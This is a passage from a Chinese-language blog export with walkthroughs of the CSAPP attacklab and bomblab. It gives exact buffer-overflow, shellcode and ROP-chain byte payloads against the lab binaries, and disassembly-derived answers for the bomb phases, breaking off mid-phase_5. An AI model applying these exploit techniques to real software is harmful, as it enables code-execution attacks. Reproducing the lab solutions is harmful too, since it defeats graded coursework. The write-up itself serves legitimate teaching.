attacklab","slug":"CSAPP-attacklab","date":"2020-02-19T09:39:55.000Z","updated":"2020-02-19T12:52:03.085Z","comments":true,"path":"2020/02/19/CSAPP-attacklab/","link":"","permalink":"http://mcginn7.github.io/2020/02/19/CSAPP-attacklab/","excerpt":"","text":"知识点 在这个实验中，学习利用缓存溢出（buffer overflow）来改变程序的行为，即完成攻击者的目的效果。 需要掌握 x86-64 的栈和参数传递机制，其结构如下图所示。 其中函数 P 调用了函数 Q，返回地址为函数 P 调用位置的下一条指令。实验攻击均修改该返回地址来完成攻击目的。 题目实验中的程序 CTARGET 和 RTARGET 都调用了函数 test： 12345void test() &#123; int val; val = getbuf(); printf(\"No exploit. Getbuf returned 0x%x\\n\", val);&#125; 函数 test 又调用了函数 getbuf： 12345unsigned getbuf() &#123; char buf[BUFFER_SIZE]; Gets(buf); return 1; &#125; 函数 Gets 从标准输入读取输入。 函数 Gets 没有进行边界检查，因此是不安全。 数组 buf 是局部变量，存储于栈上，因而通过输入可以修改栈上数据达到攻击目的。 BUFFER_SIZE 是个常量，使用 gdb ctarget 和 disas getbuf 可查看其大小（在本实验中，BUFFER_SIZE = 0x28）。 Level 1要求针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch1 函数而非 test。 做法使用 disas touch1 查看函数 touch1 的地址为 0x4017c0。 使用 disas getbuf 查看汇编代码： 1234560x4017a8 &lt;+0&gt;: sub $0x28,%rsp0x4017ac &lt;+4&gt;: mov %rsp,%rdi0x4017af &lt;+7&gt;: callq 0x401a40 &lt;Gets&gt;0x4017b4 &lt;+12&gt;: mov $0x1,%eax0x4017b9 &lt;+17&gt;: add $0x28,%rsp0x4017bd &lt;+21&gt;: retq 当读入字符串超过 40 时，依据栈帧结构，第 41~48 个字节即为返回地址，因此将其设置为 touch1 的地址即可。 实验工具包提供了 hex2raw 将字节码（十六进制）转换成字符串，输入字节为： 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 00 00 00 00 使用 hex2raw 转换字节码序列： 12./hex2raw &lt; bytes &gt; args.txt./ctarget -q -i args.txt Level 2要求针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch2 函数而非 test。 1234567891011void touch2(unsigned val) &#123; vlevel = 2; /* Part of validation protocol */ if (val == cookie) &#123; printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); &#125; else &#123; printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); &#125; exit(0);&#125; 做法使用 disas touch2 查看函数 touch2 的地址为 0x4017ec。 函数 touch2 需要传递参数 val，该参数的值等于实验工具包中 cookie.txt 保存值（在本实验中 cookie=0x59b997fa）。 函数的参数传递先使用 6 个寄存器，更多的参数保存在栈中。前 6 个寄存器如下图所示： 第一个参数寄存器为 %rdi，因此需要注入执行代码将 cookie 值保存到寄存器 %rdi 中。 首先执行代码本质上是字节序列，其次返回地址指向下一条指令的地址，最后 CTARGET 的堆栈位置每次运行都保持一致。利用这三条性质可将返回地址指向栈的某个位置，并在该位置填入合法的指令字节序列，注入攻击代码。 A. 查看数组 buf 在栈上的保存位置。 使用 b getbuf 在函数 getbuf 的第一条指令设置断点，然后使用 n 2 执行一下两条指令： 120x4017a8 &lt;+0&gt;: sub $0x28,%rsp0x4017ac &lt;+4&gt;: mov %rsp,%rdi 此时 %rdi = %rsp，为函数 Gets 的参数 buf，因此输入字符串的起始地址等于 %rsp。 使用 print /x $rsp 查看 %rsp 的值为 0x5561dc78，即 CTARGET 每次运行时 buf 的地址都是 0x5561dc78。 B. 生成注入代码的字节序列。 与 Level 1 类似，用 0x5561dc78 覆盖 getbuf 的返回地址，然后从 0x5561dc78 开始填充注入代码：保存 cookie 值到 %rdi，然后跳转执行 touch2，其汇编代码如下： 123mov $0x59b997fa, %rdipush $0x4017ec # 填充 touch2 作为新返回地址retq # 跳转到 touch2 将上述代码保存为 exec.s，使用以下命令查看指令字节序列： 12gcc -c exec.sobjdump -d exec.o 指令字节序列为： 12345678exec.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq C. CTARGET 的输入字节序列 12345648 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 Level 3要求针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch3 函数而非 test。 1234567891011void touch3(char *sval) &#123; vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) &#123; printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); &#125; else &#123; printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); &#125; exit(0);&#125; 其中，touch3 会调用函数 hexmatch 以比较输入字符串是否和 cookie 的字符串相同，新的函数会使用并覆盖栈上的数据。 做法在该实验中需要将 cookie 的字符串保存到栈上，并将其起始地址保存到 %rdi 上。 解法和 Level 2 类似，但要注意一点，touch3 中的 hexmatch 会使用栈而破坏输入的字节序列，导致 cookie 的字符串序列无效。 为了避免上述情况发生，与新函数执行相同，先开辟一段新的栈区以保护输入序列： 1234lea -24(%rsp), %rdi # cookie 字符串地址sub $0x30, %rsp # 开辟栈区push $0x4018fa # touch3 地址ret 使用 gcc -c exec.s 和 objdump -d exec.o 查看指令字节序列： 123456789exec.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 8d 7c 24 e8 lea -0x18(%rsp),%rdi 5: 48 83 ec 30 sub $0x30,%rsp 9: 68 fa 18 40 00 pushq $0x4018fa e: c3 retq CTARGET 的输入字节序列： 12345648 8d 7c 24 e8 48 83 ec30 68 fa 18 40 00 c3 0000 00 00 00 00 00 00 0035 39 62 39 39 37 66 6100 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 Level 4要求针对程序 RTARGET，修改函数 test 调用 getbuf 的返回地址，使其返回 touch2 函数而非 test。 在该实验中，禁止执行栈中的指令，并且栈的地址也会发生变化。因此，Level 1~3 的做法失效了。 做法在该实验中通过找出已有指令的字节序列作为工具片段（gadget），其原理如下图所示。通过工具片段来解决无法执行栈中指令的问题。 每个工具片段以 ret(编码 0xc3) 结尾，将工具片段地址保存在栈上，ret 依次解栈来执行下一条工具片段。 该实现限制了指令集 movq, popq, ret 和 nop。 该实验的思路比较清晰：通过 popq 从栈中取数据，然后使用将数据保存到相应的寄存器（如 %rdi）即可。 使用 disas /r getval_142 依次查看每个工具函数的指令序列。 其中，关键的工具函数有 addval_273 和 addval_219： 123456789Dump of assembler code for function addval_273: 0x4019a0 &lt;+0&gt;: 8d 87 48 89 c7 c3 lea ,%eax 0x4019a6 &lt;+6&gt;: c3 retqEnd of assembler dump.Dump of assembler code for function addval_219: 0x4019a7 &lt;+0&gt;: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 0x4019ad &lt;+6&gt;: c3 retqEnd of assembler dump. 在 addval_273 中可以提取指令序列： 120x4019a2: 48 89 c7 movq %rax, %rdi0x4019a5: c3 retq 在 addval_219 中可以提取指令序列： 1230x4019ab: 58 popq %rax0x4019ac: 90 nop0x4019ad: c3 retq 显然，通过工具片段 0x4019ab 提取 cookie 到 %rax，然后使用 0x4019a2 将 cookie 转移到 %rdi，完成参数构造。 RTARGET 的输入字节序列： 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00a2 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00 Level 5要求针对程序 RTARGET，修改函数 test 调用 getbuf 的返回地址，使其返回 touch3 函数而非 test。 在该实验中，禁止执行栈中的指令，并且栈的地址也会发生变化。因此，Level 1~3 的做法失效了。 做法做法与 Level 4 类似，但是需要更多的工具片段，额外需要一条 lea 指令计算 cookie 字符串的地址。 关键工具函数及提取的工具片段如下，函数顺序表示了执行顺序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364000027 &lt;addval_219&gt;: 0x4019a7 &lt;+0&gt;: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 0x4019ad &lt;+6&gt;: c3 retq # 提取工具片段 0x4019ab: 58 pop %rax 0x4019ac: 90 0x4019ad: c30001b2 &lt;addval_487&gt;: 0x401a40 &lt;+0&gt;: 8d 87 89 c2 84 c0 lea -0x3f7b3d77(%rdi),%eax 0x401a46 &lt;+6&gt;: c3 retq # 提取工具片段 0x401a42: 89 c2 movl %eax, %edx 0x401a44: 84 c0 tesb %al, %al 0x401a46: c3 retq000196 &lt;getval_159&gt;: 0x401a33 &lt;+0&gt;: b8 89 d1 38 c9 mov $0xc938d189,%eax 0x401a38 &lt;+5&gt;: c3 retq # 提取工具片段 0x401a34: 89 d1 movl %edx, %ecx 0x401a36: 38 c9 cmpb %cl, %cl 0x401a38: c3 retq000143 &lt;addval_436&gt;: 0x401a11 &lt;+0&gt;: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 0x401a17 &lt;+6&gt;: c3 retq # 提取工具片段 0x401a13: 89 ce movl %ecx, %esi 0x401a15: 90 nop 0x401a16: 90 nop 0x401a17: c3 retq0002b8 &lt;setval_350&gt;: 0x401aab &lt;+0&gt;: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 0x401ab1 &lt;+6&gt;: c3 retq # 提取工具片段 0x401aad: 48 89 e0 mov %rsp, %rax 0x401ab0: 90 0x401ab1: c3000016 &lt;addval_273&gt;: 0x4019a0 &lt;+0&gt;: 8d 87 48 89 c7 c3 lea -0x3c3876b8 (%rdi),%eax 0x4019a6 &lt;+6&gt;: c3 retq # 提取工具片段 0x4019a2: 48 89 c7 mov %rax, %rdi 0x4019a5: c30000a2 &lt;add_xy&gt;: 0x4019d6 &lt;+0&gt;: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 0x4019da &lt;+4&gt;: c3 retq # 提取工具片段 0x4019d6: 48 8d 04 37 lea (%rdi, %rsi, 1), %rax 0x4019da: c3000016 &lt;addval_273&gt;: 0x4019a0 &lt;+0&gt;: 8d 87 48 89 c7 c3 lea -0x3c3876b8 (%rdi),%eax 0x4019a6 &lt;+6&gt;: c3 retq # 提取工具片段 0x4019a2: 48 89 c7 mov %rax, %rdi 0x4019a5: c3xxxxxx &lt;touch3&gt; 0x4018fa RTARGET 的输入字节序列： 123456789101112131415161700 11 22 33 44 55 66 7700 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 0020 00 00 00 00 00 00 0042 1a 40 00 00 00 00 0034 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100","categories":[],"tags":[]},{"title":"CSAPP - bomblab","slug":"CSAPP-bomblab","date":"2020-02-16T13:06:08.000Z","updated":"2020-02-18T02:43:03.399Z","comments":true,"path":"2020/02/16/CSAPP-bomblab/","link":"","permalink":"http://mcginn7.github.io/2020/02/16/CSAPP-bomblab/","excerpt":"","text":"安装 GDB问题一在 Ubuntu 18.04 LTS 中使用 apt-get install gdb 安装失败。替换使用国内 Ubuntu 的镜像源后安装成功。 首先更新 /etc/apt/sources.list，将该文件内容替换为阿里源： 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 运行 apt-get update 和 apt-get upgrade 更新。 安装 gdb：apt-get install gdb。 问题二执行 gdb 调试时，遇到 Error disabling address space randomization 错误，参考 warning: Error disabling address space randomization: Operation not permitted，在创建 docker 容器时添加 --security-opt seccomp=unconfined 参数： 1docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined ubuntu bash 题目phase_1调用 disassemble phase_1 反汇编函数 phase_1 ： 123456780x400ee0 &lt;+0&gt;: sub $0x8,%rsp0x400ee4 &lt;+4&gt;: mov $0x402400,%esi0x400ee9 &lt;+9&gt;: callq 0x401338 &lt;strings_not_equal&gt;0x400eee &lt;+14&gt;: test %eax,%eax0x400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt;0x400ef2 &lt;+18&gt;: callq 0x40143a &lt;explode_bomb&gt;0x400ef7 &lt;+23&gt;: add $0x8,%rsp0x400efb &lt;+27&gt;: retq 显然，该函数调用了函数 strings_not_equal，判断两个字符串是否相同。第一个字符串参数 %rdi 为输入 input 的地址，第二个参数为比较字符串的地址 0x402400。 在 gdb 中调用 print (char *) 0x402400 输出该地址的字符串： 1Border relations with Canada have never been better. 因此 bomb 的第 1 组运行参数为上述字符串。 phase_2调用 disassemble phase_2 反汇编函数 phase_2 ： 123456789101112131415161718192021222324250x400efc &lt;+0&gt;: push %rbp0x400efd &lt;+1&gt;: push %rbx0x400efe &lt;+2&gt;: sub $0x28,%rsp0x400f02 &lt;+6&gt;: mov %rsp,%rsi0x400f05 &lt;+9&gt;: callq 0x40145c &lt;read_six_numbers&gt;0x400f0a &lt;+14&gt;: cmpl $0x1,(%rsp)0x400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt;0x400f10 &lt;+20&gt;: callq 0x40143a &lt;explode_bomb&gt;0x400f15 &lt;+25&gt;: jmp 0x400f30 &lt;phase_2+52&gt;0x400f17 &lt;+27&gt;: mov -0x4(%rbx),%eax0x400f1a &lt;+30&gt;: add %eax,%eax0x400f1c &lt;+32&gt;: cmp %eax,(%rbx)0x400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt;0x400f20 &lt;+36&gt;: callq 0x40143a &lt;explode_bomb&gt;0x400f25 &lt;+41&gt;: add $0x4,%rbx0x400f29 &lt;+45&gt;: cmp %rbp,%rbx0x400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt;0x400f2e &lt;+50&gt;: jmp 0x400f3c &lt;phase_2+64&gt;0x400f30 &lt;+52&gt;: lea 0x4(%rsp),%rbx0x400f35 &lt;+57&gt;: lea 0x18(%rsp),%rbp0x400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt;0x400f3c &lt;+64&gt;: add $0x28,%rsp0x400f40 &lt;+68&gt;: pop %rbx0x400f41 &lt;+69&gt;: pop %rbp0x400f42 &lt;+70&gt;: retq 最先调用了函数 read_six_numbers，其起始地址为 0x40145c，调用 disassemble 0x40145c 反汇编其代码： 12345678910111213141516170x40145c &lt;+0&gt;: sub $0x18,%rsp0x401460 &lt;+4&gt;: mov %rsi,%rdx0x401463 &lt;+7&gt;: lea 0x4(%rsi),%rcx0x401467 &lt;+11&gt;: lea 0x14(%rsi),%rax0x40146b &lt;+15&gt;: mov %rax,0x8(%rsp)0x401470 &lt;+20&gt;: lea 0x10(%rsi),%rax0x401474 &lt;+24&gt;: mov %rax,(%rsp)0x401478 &lt;+28&gt;: lea 0xc(%rsi),%r90x40147c &lt;+32&gt;: lea 0x8(%rsi),%r80x401480 &lt;+36&gt;: mov $0x4025c3,%esi0x401485 &lt;+41&gt;: mov $0x0,%eax0x40148a &lt;+46&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x40148f &lt;+51&gt;: cmp $0x5,%eax0x401492 &lt;+54&gt;: jg 0x401499 &lt;read_six_numbers+61&gt;0x401494 &lt;+56&gt;: callq 0x40143a &lt;explode_bomb&gt;0x401499 &lt;+61&gt;: add $0x18,%rsp0x40149d &lt;+65&gt;: retq 先注意该函数调用了 sscanf 函数，其从一个字符串而不是标准输入流读取输入。sscanf 的第二个参数为输入格式，尝试打印其字符串（0x4025c3）： 1$1 = 0x4025c3 &quot;%d %d %d %d %d %d&quot; 与函数名相应，该函数从输入 input 中读取 6 个整数。 由于sscanf 参数超过 6 个，前 6 个参数按序分别存储于 %edi, %esi, %rdx, %rcx, %r8, %r9，剩余两个参数存储于栈中，其中第 7 个参数位于栈顶。阅读代码可知 6 个整数按序存储于 %rsi, %rsi + 4, …, %rsi + 20。 0x400f0a 行的代码表示读入的第 1 个数必须等于 1。 从 0x400f17 到 0x400f2c 的代码表示，*(rbp) = *(rbp - 0x4) * 2，即读入的 6 个整数表示首项为 1 公比为 2 的等比数列： 11 2 4 8 16 32 该序列为 bomb 的第 2 组运行参数。 phase_3调用 disassemble phase_3 反汇编函数 phase_3 ： 1234567891011121314151617181920212223242526272829303132333435360x400f43 &lt;+0&gt;: sub $0x18,%rsp0x400f47 &lt;+4&gt;: lea 0xc(%rsp),%rcx0x400f4c &lt;+9&gt;: lea 0x8(%rsp),%rdx0x400f51 &lt;+14&gt;: mov $0x4025cf,%esi0x400f56 &lt;+19&gt;: mov $0x0,%eax0x400f5b &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x400f60 &lt;+29&gt;: cmp $0x1,%eax0x400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt;0x400f65 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt;0x400f6a &lt;+39&gt;: cmpl $0x7,0x8(%rsp)0x400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt;0x400f71 &lt;+46&gt;: mov 0x8(%rsp),%eax0x400f75 &lt;+50&gt;: jmpq *0x402470(,%rax,8)0x400f7c &lt;+57&gt;: mov $0xcf,%eax0x400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400f83 &lt;+64&gt;: mov $0x2c3,%eax0x400f88 &lt;+69&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400f8a &lt;+71&gt;: mov $0x100,%eax0x400f8f &lt;+76&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400f91 &lt;+78&gt;: mov $0x185,%eax0x400f96 &lt;+83&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400f98 &lt;+85&gt;: mov $0xce,%eax0x400f9d &lt;+90&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400f9f &lt;+92&gt;: mov $0x2aa,%eax0x400fa4 &lt;+97&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400fa6 &lt;+99&gt;: mov $0x147,%eax0x400fab &lt;+104&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400fad &lt;+106&gt;: callq 0x40143a &lt;explode_bomb&gt;0x400fb2 &lt;+111&gt;: mov $0x0,%eax0x400fb7 &lt;+116&gt;: jmp 0x400fbe &lt;phase_3+123&gt;0x400fb9 &lt;+118&gt;: mov $0x137,%eax0x400fbe &lt;+123&gt;: cmp 0xc(%rsp),%eax0x400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt;0x400fc4 &lt;+129&gt;: callq 0x40143a &lt;explode_bomb&gt;0x400fc9 &lt;+134&gt;: add $0x18,%rsp0x400fcd &lt;+138&gt;: retq 首先看函数 sscanf 的调用：0x4025cf 地址字符串为 $2 = 0x4025cf &quot;%d %d&quot;，从 input 读取两个整数，分别存储于地址 0x8(%rsp) 和 0xc(%rsp)。 cmpl $0x7,0x8(%rsp) 和 ja 0x400fad &lt;phase_3+106&gt; 表明，第一个整数的值不能超过 7。 jmpq *0x402470(,%rax,8) 表示跳转到 (0x402470 + 8 %rax) 处，而 %rax 的值此时等于读取的第一个整数。假设输入的第一个整数为 0，下一个指令的地址为 0x402470，使用 print /x *0x402470 打印出地址的值为 0x400f7c，即指令 jmpq *0x402470(,%rax,8) 等同于 jmpq 0x400f7c。地址为 0x400f7c 的指令为 mov $0xcf,%eax，随后跳转到 cmp 0xc(%rsp),%eax，即与输入的第二个整数比较，相同时结束该函数调用。说明当输入为 0 207 时（0xcf = 207），phase_3 不会爆炸。 对于第 1 个整数分别为 1~7 时，其推理过程也是类似的，其结果如下表： .tg {border-collapse:collapse;border-spacing:0;border:none;border-color:#aaa;}.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-color:#aaa;color:#333;background-color:#fff;}.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-color:#aaa;color:#fff;background-color:#f38630;}.tg .tg-vswx{background-color:#fd6864;border-color:inherit;text-align:center;vertical-align:top}.tg .tg-c3ow{border-color:inherit;text-align:center;vertical-align:top} 数1 下条指令地址 跳转地址 数2（16进制） 数2（10进制） 0 0x402470 0x400f7c 0xcf 207 1 0x402478 0x400fb9 0x137 311 2 0x402480 0x400f83 0x2c3 707 3 0x402488 0x400f8a 0x100 256 4 0x402490 0x400f91 0x185 389 5 0x402498 0x400f98 0xce 206 6 0x4024a0 0x400f9f 0x2aa 682 每对&lt;数1，数2&gt;均可作为 bomb 的第 3 组参数。 phase_4调用 disassemble phase_4 反汇编函数 phase_4： 123456789101112131415161718192021220x40100c &lt;+0&gt;: sub $0x18,%rsp0x401010 &lt;+4&gt;: lea 0xc(%rsp),%rcx0x401015 &lt;+9&gt;: lea 0x8(%rsp),%rdx0x40101a &lt;+14&gt;: mov $0x4025cf,%esi0x40101f &lt;+19&gt;: mov $0x0,%eax0x401024 &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x401029 &lt;+29&gt;: cmp $0x2,%eax0x40102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt;0x40102e &lt;+34&gt;: cmpl $0xe,0x8(%rsp)0x401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt;0x401035 &lt;+41&gt;: callq 0x40143a &lt;explode_bomb&gt;0x40103a &lt;+46&gt;: mov $0xe,%edx0x40103f &lt;+51&gt;: mov $0x0,%esi0x401044 &lt;+56&gt;: mov 0x8(%rsp),%edi0x401048 &lt;+60&gt;: callq 0x400fce &lt;func4&gt;0x40104d &lt;+65&gt;: test %eax,%eax0x40104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt;0x401051 &lt;+69&gt;: cmpl $0x0,0xc(%rsp)0x401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt;0x401058 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt;0x40105d &lt;+81&gt;: add $0x18,%rsp0x401061 &lt;+85&gt;: retq 首先看读入部分，相关代码如下： 123456780x40100c &lt;+0&gt;: sub $0x18,%rsp0x401010 &lt;+4&gt;: lea 0xc(%rsp),%rcx0x401015 &lt;+9&gt;: lea 0x8(%rsp),%rdx0x40101a &lt;+14&gt;: mov $0x4025cf,%esi0x40101f &lt;+19&gt;: mov $0x0,%eax0x401024 &lt;+24&gt;: callq 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x401029 &lt;+29&gt;: cmp $0x2,%eax0x40102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt; 函数 sscanf 的参数一为 %rdi，存储输入 input 的地址；参数二为 %esi，使用 (gdb) print （char *) 0x4025cf 查看该地址的字符串，其值为 “%d %d” 表示读入两个整数；参数三为 %rdx=%rsp+0x8, 参数四为 %rcx=%rsp + %c，说明读入的两个整数分别存储于地址 %rsp+0x8 和 %rsp+0xc。 %eax 表示读入的整数数量，如果不为 2 则跳转到调用 explode_bomb 函数的指令地址。 接下来，程序准备调用函数 func4： 12345670x40102e &lt;+34&gt;: cmpl $0xe,0x8(%rsp)0x401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt;0x401035 &lt;+41&gt;: callq 0x40143a &lt;explode_bomb&gt;0x40103a &lt;+46&gt;: mov $0xe,%edx0x40103f &lt;+51&gt;: mov $0x0,%esi0x401044 &lt;+56&gt;: mov 0x8(%rsp),%edi0x401048 &lt;+60&gt;: callq 0x400fce &lt;func4&gt; 0x40102e~0x401035（1~3 行）：要求读入的第一个整数必须 ≤14。 0x40103a~0x401044（4~6 行）：构造 func4 参数：第一个整数，0，14，即调用函数 func4(数一，0，14)。 处理函数 func4 的返回值： 120x40104d &lt;+65&gt;: test %eax,%eax0x40104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt; 如果 func4() 返回值不等于 0，则跳转并调用 explode_bomb。 处理读入的第二个整数： 123450x401051 &lt;+69&gt;: cmpl $0x0,0xc(%rsp)0x401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt;0x401058 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt;0x40105d &lt;+81&gt;: add $0x18,%rsp0x401061 &lt;+85&gt;: retq 如果数二等于 0，则跳转指令并结束；否则调用 explode_bomb。 调用 disassemble func4 反汇编函数 func4： 123456789101112131415161718192021220x400fce &lt;+0&gt;: sub $0x8,%rsp0x400fd2 &lt;+4&gt;: mov %edx,%eax0x400fd4 &lt;+6&gt;: sub %esi,%eax0x400fd6 &lt;+8&gt;: mov %eax,%ecx0x400fd8 &lt;+10&gt;: shr $0x1f,%ecx0x400fdb &lt;+13&gt;: add %ecx,%eax0x400fdd &lt;+15&gt;: sar %eax0x400fdf &lt;+17&gt;: lea (%rax,%rsi,1),%ecx0x400fe2 &lt;+20&gt;: cmp %edi,%ecx0x400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt;0x400fe6 &lt;+24&gt;: lea -0x1(%rcx),%edx0x400fe9 &lt;+27&gt;: callq 0x400fce &lt;func4&gt;0x400fee &lt;+32&gt;: add %eax,%eax0x400ff0 &lt;+34&gt;: jmp 0x401007 &lt;func4+57&gt;0x400ff2 &lt;+36&gt;: mov $0x0,%eax0x400ff7 &lt;+41&gt;: cmp %edi,%ecx0x400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt;0x400ffb &lt;+45&gt;: lea 0x1(%rcx),%esi0x400ffe &lt;+48&gt;: callq 0x400fce &lt;func4&gt;0x401003 &lt;+53&gt;: lea 0x1(%rax,%rax,1),%eax0x401007 &lt;+57&gt;: add $0x8,%rsp0x40100b &lt;+61&gt;: retq 在第 2 步中已知 func4 的三个参数为整数，因此这里将 func4 定义为 int func4(int a, int b, int c)，其中 %edi = a, %esi = b, %edx = c。 0x400fd2~0x400fdf（2~8 行）：%eax = (c - b) / 2, %ecx = b + (c - b) / 2。记 m = b + (c - b) / 2，为区间 [b, c] 的中点。 0x400fe2~0x400fe4（9-10 行）：如果 %ecx &lt;= %edi（即 m &lt;= a），则跳转到 0x400ff2。 a. 不跳转时，执行 0x400fe6~0x400ff0（11~14 行）：调用并返回结果值 2 * func4(a, b, m - 1)。 b. 发生跳转，执行 0x400ff2~0x400ff9（15~17 行）：如果 %ecx &gt;= %edi（即 m &gt;= a），返回结果值 0，否咋调用并返回 2 * func(a, m + 1, c) + 1。 依据第 3 步的推论，func4(数 1, 0, 14) 的结果必须为 0，因此数一等于 7。 因此 7 0 为 bomb 的第 4 组运行参数。 phase_5调用 disassemble phase_5 反汇编函数 phase_5 12345678910111213141516171819202122232425262728293031323334353637380x401062 &lt;+0&gt;: push %rbx0x401063 &lt;+1&gt;: sub $0x20,%rsp0x401067 &lt;+5&gt;: mov %rdi,%rbx0x40106a &lt;+8&gt;: mov %fs:0x28,%rax0x401073 &lt;+17&gt;: mov %rax,0x18(%rsp)0x401078 &lt;+22&gt;: xor %eax,%eax0x40107a &lt;+24&gt;: callq 0x40131b &lt;string_length&gt;0x40107f &lt;+29&gt;: cmp $0x6,%eax0x401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x401084 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt;0x401089 &lt;+39&gt;: jmp 0x4010d2 &lt;phase_5+112&gt;0x40108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx0x40108f &lt;+45&gt;: mov %cl,(%rsp)0x401092 &lt;+48&gt;: mov (%rsp),%rdx0x401096 &lt;+52&gt;: and $0xf,%edx0x401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx0x4010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1)0x4010a4 &lt;+66&gt;: add $0x1,%rax0x4010a8 &lt;+70&gt;: cmp $0x6,%rax0x4010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt;0x4010ae &lt;+76&gt;: movb $0x0,0x16(%rsp)0x4010b3 &lt;+81&gt;: mov $0x40245e,%esi0x4010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi0x4010bd &lt;+91&gt;: callq 0x401338 &lt;strings_not_equal&gt;0x4010c2 &lt;+96&gt;: test %eax,%eax0x4010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x4010c6 &lt;+100&gt;: callq 0x40143a &lt;explode_bomb&gt;0x4010cb &lt;+105&gt;: nopl 0x0(%rax,%rax,1)0x4010d0 &lt;+110&gt;: jmp 